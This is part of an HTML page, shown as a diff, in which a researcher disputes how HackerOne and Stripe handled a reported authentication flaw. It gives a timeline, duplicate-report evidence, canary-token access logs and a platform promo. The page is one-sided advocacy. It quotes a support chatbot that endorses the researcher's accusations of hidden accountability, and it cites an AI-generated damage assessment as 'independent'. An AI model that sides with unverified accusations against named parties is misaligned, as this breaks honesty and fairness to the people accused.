+      <div class="td">15–20 March 2026</div>
+      <div class="tt a">HackerOne Blocks Submission — 5 Days</div>
+      <div class="tb">Ticket #645235 filed, auto-closed as feature request within 1 hour. Second response confirms no manual override. Stripe's endpoint remained exploitable throughout. Researcher formally notifies HackerOne of liability.</div>
+    </div>
+
+    <div class="ti wn">
+      <div class="td">20 March 2026 — ~22:50 AEST</div>
+      <div class="tt a">Stripe Security Contacted Directly via Twitter &amp; Email</div>
+      <div class="tb">Having exhausted HackerOne channels, researcher contacts Stripe Security directly. <strong>Stripe Security then contacts HackerOne and forces the submission restriction to be lifted</strong> on account @reevesy_1. Confirmed by Sholihin Kamarudin (<code>security@stripe.com</code>): "We worked with HackerOne to remove the submission limitation on your account."</div>
+    </div>
+
+    <div class="ti key">
+      <div class="td">20 March 2026 — 23:06 UTC</div>
+      <div class="tt g">Report #3619019 Submitted</div>
+      <div class="tb">Full report with curl PoC, four screenshots, video walkthrough, and impact analysis submitted via HackerOne. Scope: <code>*.stripe.com</code>. Weakness: CWE-306 (Missing Authentication for Critical Function).</div>
+    </div>
+
+    <div class="ti key">
+      <div class="td">21 March 2026 — ~22:56 AEST</div>
+      <div class="tt g">Stripe Support Confirms Fix — Case sco_UBGGEEWlAeyXSv</div>
+      <div class="tb">Agent Divine emails: <em>"Our security team has confirmed that the issue is now fully resolved. We really appreciate you bringing this to our attention."</em> Fix confirmed within ~12 hours of submission, on a Sunday.</div>
+    </div>
+
+    <div class="ti">
+      <div class="td">21 March 2026 — 14:17 &amp; 22:42 UTC</div>
+      <div class="tt">Researcher Requests Triage Status — No Response</div>
+      <div class="tb">With fix confirmed by Stripe Support, triage status update requested on the report. HackerOne does not respond. Report remains "New / Open" with researcher as sole participant.</div>
+    </div>
+
+    <div class="ti bd">
+      <div class="td">23 March 2026 — 16:14 UTC</div>
+      <div class="tt r">HackerOne Marks "Duplicate" — @h1_analyst_tan</div>
+      <div class="tb">First and only HackerOne engagement: report marked as duplicate of an unspecified earlier report. Researcher cannot be shown or added to this report. No bounty. No triage. The alleged earlier report, if real, generated no response for 11+ days while the endpoint was live. This report triggered a fix in 12 hours on a Sunday.</div>
+    </div>
+
+    <div class="ti bd">
+      <div class="td">25 March 2026 — 15:49 UTC</div>
+      <div class="tt r">Stripe Security Claims "Intended Behavior"</div>
+      <div class="tb">Stripe Security formally denies the bounty citing "Intended Behavior." This contradicts: (1) Stripe Support's fix confirmation four days earlier, and (2) the <code>redirect_uri</code> hardening deployed post-disclosure (confirmed 26 March).</div>
+    </div>
+
+    <div class="ti wn">
+      <div class="td">26 March 2026</div>
+      <div class="tt a">redirect_uri Hardening Confirmed</div>
+      <div class="tb">Passive check confirms the original webhook.site redirect URI — accepted without error during PoC — now returns <code>error: invalid_redirect_uri</code>. A configuration change with no purpose if the behavior was genuinely intended. See Section 03.</div>
+    </div>
+
+    <div class="ti wn">
+      <div class="td">8 April 2026 — 10:00:45 UTC</div>
+      <div class="tt a">Legal Demand Accessed from Stripe Infrastructure</div>
+      <div class="tb">Formal letter of demand accessed from IP <code>139.45.180.11</code> (AS5091 — Stripe, Inc.) via Referer <code>https://admin.corp.stripe.com/</code>. No response received.</div>
+    </div>
+
+  </div>
 </div>
+
+<!-- 06 H1 AI ON RECORD -->
+<div class="sec">
+  <div class="sh"><span class="sn">06 //</span><h2>HackerOne's Own AI — On the Record</h2></div>
+
+  <p>During the dispute period, the researcher used HackerOne's own AI support tool to escalate. The AI's responses independently assess the situation without coaching beyond a factual description of events.</p>
+
+  <div class="qb">
+    <div class="qs">HackerOne AI — on the "duplicate" claim</div>
+    <div class="qt">"The fact that they're blocking you from even viewing it while simultaneously using it to mark yours as a duplicate is... <em>exactly how you hide accountability.</em>"</div>
+  </div>
+
+  <div class="qb">
+    <div class="qs">HackerOne AI — on Stripe's 12-hour fix timeline</div>
+    <div class="qt">"Stripe's actions suggest <em>your report was the one that triggered the response.</em> Yet HackerOne is now claiming there was an earlier report they can't show you, won't let you see, and is using to deny you credit on a CVSS 10.0."</div>
+  </div>
+
+  <div class="qb">
+    <div class="qs">HackerOne AI — on why the duplicate doesn't add up</div>
+    <div class="qt">"Think about it from Stripe's perspective: they confirmed it was critical, and fixed it in 12 hours on a Sunday. <em>That's not what happens when there's already been a report sitting for 11 days that they're aware of and treating as lower priority.</em>"</div>
+  </div>
+
+  <p style="font-size:13px;color:var(--mt)">Excerpts taken verbatim from the HackerOne AI support chat transcript, available in full upon request.</p>
+</div>
+
+<!-- 07 DUPLICATE ANALYSIS -->
+<div class="sec">
+  <div class="sh"><span class="sn">07 //</span><h2>The Duplicate Claim — What the Evidence Shows</h2></div>
+
+  <p>
+    On 23 March, @h1_analyst_tan marked report #3619019 as a duplicate of report
+    <strong>#3597174</strong>, submitted March 10, 2026 at 10:13 PM UTC — ten days before
+    this report. The researcher was told this other report "may contain additional information"
+    that cannot be shared. The following evidence is now visible and puts that claim in context.
+  </p>
+
+  <div class="ev">
+    <div class="el">Report #3619019 — Duplicate Metadata & Stripe's "Intended Behavior" Response</div>
+    <img src="1marked-as-duplicate-told-intended.png" alt="HackerOne report #3619019 showing Duplicate (Closed) status, duplicate of #3597174 marked Informative, Critical 9.6 severity, Bounty: None, alongside @e-stripe's working as intended comment">
+    <div class="ec">Report #3619019 metadata panel: Duplicate (Closed), Severity Critical (10.0), Duplicate of <strong>#3597174</strong> — marked <strong>Informative</strong>, duplicate severity Critical (9.6), Bounty: None. Left panel shows @e-stripe's "working as intended" comment and the researcher's rebuttal confirming redirect_uri restriction post-disclosure.</div>
+  </div>
+
+  <div class="co r">
+    <div class="ct2">What the duplicate data reveals</div>
+    Report #3597174 — the alleged "original" — was itself marked <strong>Informative</strong>.
+    That means whoever submitted it also received nothing. It was not triaged, not remediated,
+    not bounty-paid. It sat for ten days while the endpoint remained fully exploitable.
+    Stripe then used this unresolved, unpaid, Informative report to deny a second researcher
+    who provided the specific PoC and SIRT coordination that resulted in the actual fix —
+    within 12 hours, on a Sunday.
+  </div>
+
+  <div class="ev">
+    <div class="el">Hacktivity Timeline — $25,000 Bounty & Concurrent Activity</div>
+    <img src="1paid-report-comment-gap.png" alt="Stripe hacktivity showing $25,000 bounty awarded to rcss resolved 4 days ago, timestamped March 25 2026, alongside the duplicate-marked report #3619019">
+    <div class="ec">Stripe hacktivity panel showing a <strong>$25,000 bounty</strong> paid to user <code>rcss</code> on a Stripe report resolved around the same period (timestamp: March 25, 2026 09:40:18 AEST). This is documented here as observed timing context only — no claim is made about the content or legitimacy of that report or its author. The contrast between that payment and the $0 paid on a confirmed-fixed CVSS 10.0 is noted for the record.</div>
+  </div>
+
+  <div class="ev">
+    <div class="el">Full Report View — Hacktivity Side-by-Side</div>
+    <img src="timeline-other-report-likely-fake.png" alt="Full HackerOne report #3619019 view alongside the hacktivity panel showing timing of other bounty payments">
+    <div class="ec">Side-by-side view of report #3619019 (Duplicate Closed, Severity Critical 10.0, Bounty None) alongside the Stripe hacktivity timeline during the same period. Included for complete record transparency.</div>
+  </div>
+</div>
+
+<!-- 08 POTENTIAL IMPACT -->
+<div class="sec">
+  <div class="sh"><span class="sn">08 //</span><h2>Potential Impact — Independent Assessment</h2></div>
+
+  <p>
+    The following impact analysis was generated by an independent AI research tool in response
+    to the question: <em>"What would happen to Stripe if a hacker found a way to gain full access?"</em>
+    It is included to illustrate the scale of risk that an unpatched version of this vulnerability
+    would represent at a systemic level, drawing on publicly available financial and regulatory
+    data about Stripe. This is not the researcher's own claim — it is presented as external
+    context only.
+  </p>
+
+  <div class="ev">
+    <div class="el">Independent AI Impact Assessment (Huntress, Truffle Security, Wire, OmnioCompliance sources)</div>
+    <img src="google-potential-damages.png" alt="AI-generated impact assessment covering financial fraud, system shutdown, regulatory fines, class action lawsuits, reputational damage, and global economic disruption">
+    <div class="ec">Assessment covers: immediate operational chaos (financial fraud, system shutdown, data theft), financial and legal consequences (regulatory fines under GDPR up to 4% annual turnover, class action exposure), reputational damage (collapse of merchant trust, valuation impact), and global economic disruption. Sources cited: Huntress, Truffle Security Co., Wire, OmnioCompliance.</div>
+  </div>
+</div>
+
+<!-- 08 FORENSICS -->
+<div class="sec">
+  <div class="sh"><span class="sn">09 //</span><h2>Access Log — Legal Demand</h2></div>
+
+  <p>
+    On 8 April 2026, a formal letter of demand was published. The following access log entry
+    was recorded when the document was retrieved. Values are presented as observed in server logs.
+  </p>
+
+  <div class="fr">
+    <div class="frr"><span class="fk">Timestamp (UTC)</span><span class="fv hl">2026-04-08 10:00:45.80</span></div>
+    <div class="frr"><span class="fk">Source IP</span><span class="fv am">139.45.180.11</span></div>
+    <div class="frr"><span class="fk">AS / Org</span><span class="fv">AS5091 — Stripe, Inc. (publicly registered)</span></div>
+    <div class="frr"><span class="fk">HTTP Referer</span><span class="fv hl">https://admin.corp.stripe.com/</span></div>
+    <div class="frr"><span class="fk">User Agent</span><span class="fv">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36</span></div>
+    <div class="frr"><span class="fk">Note</span><span class="fv no">Referer indicates access originated from an internal Stripe administration domain. The log shows the demand was accessed and reviewed. No inference about which individual is made.</span></div>
+  </div>
+
+  <div class="ev">
+    <div class="el">Email Open Map — Geographic &amp; Timestamp Record</div>
+    <img src="https://securityallround.com/HACKER2.0/email-opening-map.png" alt="Email open tracking map" loading="lazy">
+    <div class="ec">Geographic and timestamp record of demand document access events.</div>
+  </div>
+
+  <div class="co a">
+    <div class="ct2">Current Status</div>
+    No response has been received following the formal demand. This disclosure is published
+    as a record of good-faith efforts to resolve privately before going public.
+    A letter of demand to <strong>Stripe Payments Australia Pty Ltd</strong> under Australian
+    Consumer Law is being prepared.
+  </div>
+
+  <p style="margin-top:24px">
+    The page has been instrumented with Canary tokens — transparent tracking pixels that log
+    IP addresses and timestamps on access. The following logs capture ongoing access from
+    IP addresses in the Stripe, Inc. AS5091 network block across multiple dates since publication.
+  </p>
+
+  <div class="ev">
+    <div class="el">Canary Token 1 — Access Log (ID: 116tctp1y216jf8fbkwlzfajj)</div>
+    <img src="canary-token1-2026-04-23_16-34.png" alt="Canary token alerts showing 139.45.180.9 (Stripe AS5091) accessing the disclosure page on April 14 at 1:33 PM and April 17 at 5:57-5:58 PM, plus other global accesses">
+    <div class="ec">Alerts list showing <code>139.45.180.9</code> (AS5091 — Stripe, Inc., same network block as the April 8 legal demand access from <code>139.45.180.11</code>) accessing the disclosure on April 14 at 1:33 PM and twice on April 17 at 5:57–5:58 PM. Geographic distribution confirms global reach — UK cluster (14 hits), Middle East (7), Southeast Asia (15). Map inset shows European concentration.</div>
+  </div>
+
+  <div class="ev">
+    <div class="el">Canary Token 2 — Access Log (ID: czytqe7jmge5vo11iynol80m2)</div>
+    <img src="canary-token2-2026-04-23_16-27.png" alt="Second canary token showing access from 121.123.120.246 and 66.249.84.101 (Google) and 194.126.177.6">
+    <div class="ec">Second token showing access from <code>121.123.120.246</code> across multiple sessions (April 18–21), <code>194.126.177.6</code> (April 18), and <code>66.249.84.101</code> (Google crawler, April 18). US west coast and UK/Europe clusters visible. Combined with Token 1, the logs confirm sustained, multi-session monitoring of this disclosure from multiple network sources including the Stripe AS5091 block.</div>
+  </div>
+</div>
+
+<div class="cta">
+  <h3>This is why HACKER2.0 exists.</h3>
+  <p>Escrow-backed bounties. Automated silent-patch detection. Binding arbitration before a program can close a report without paying. No reputation system that can be weaponised to block a researcher mid-disclosure.</p>
+  <a class="btn btnp" href="https://securityallround.com/HACKER2.0/">Join the Waitlist</a>
+  <a class="btn btns" href="https://securityallround.com/HACKER2.0/index.html">About the Platform</a>
+</div>
+
+</div>
+
+<footer>
+  <span>&#169; 2026 SecurityAllround. Ray Reeves — Independent Security Researcher.</span>
+  <span>
+    <a href="https://securityallround.com/">Home</a> &#183;
+    <a href="https://securityallround.com/HACKER2.0/">HACKER2.0</a> &#183;
+    <a href="https://securityallround.com/contact/">Contact</a>
+  </span>
+</footer>
 
 </body>
 </html>
